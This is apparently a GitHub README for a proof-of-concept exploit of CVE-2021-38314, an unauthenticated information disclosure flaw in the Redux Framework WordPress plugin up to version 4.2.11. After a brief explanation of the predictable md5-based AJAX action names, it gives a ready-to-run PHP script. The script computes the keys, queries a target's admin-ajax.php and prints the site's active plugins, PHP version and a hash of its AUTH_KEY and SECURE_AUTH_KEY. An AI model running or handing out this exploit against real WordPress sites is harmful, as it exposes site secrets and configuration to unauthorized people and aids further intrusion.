# cve-2021-38314 - Unauthenticated Sensitive Information Disclosure
The Gutenberg Template Library & Redux Framework plugin <= 4.2.11 for WordPress registered several AJAX actions available to unauthenticated users in the `includes` function in `redux-core/class-redux-core.php` that were unique to a given site but deterministic and predictable given that they were based on an md5 hash of the site URL with a known salt value of '-redux' and an md5 hash of the previous hash with a known salt value of '-support'. These AJAX actions could be used to retrieve a list of active plugins and their versions, the site's PHP version, and an unsalted md5 hash of site&#8217;s `AUTH_KEY` concatenated with the `SECURE_AUTH_KEY` [1][2]

## Source code
```php
<?php
$target = "https://target.com";  
$key1 = md5("$target/-redux");
$key2 = file_get_contents("$target/wp-admin/admin-ajax.php?action=$key1");
$key3 = md5($key2. '-support');
$redux_code = file_get_contents("http://verify.redux.io/?hash=$key3&site=$target/");
echo file_get_contents("$target/wp-admin/admin-ajax.php?action=$key3&code=$redux_code");
```
save as the source code with .php extension

## How To Run
![usage](screenshot/poc.png)

## References:
- [1] "CVE - CVE-2021-38314," Mitre.org, 2021. [Online]. Available: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-38314. [Accessed: May 15, 2022]
- [2] Rizaldi Wahaz, “Unauthenticated Sensitive Information Disclosure at [REDACTED],” Medium, Nov. 25, 2021. [Online]. Available: https://wahaz.medium.com/unauthenticated-sensitive-information-disclosure-at-redacted-2702224098c. [Accessed: May 15, 2022]
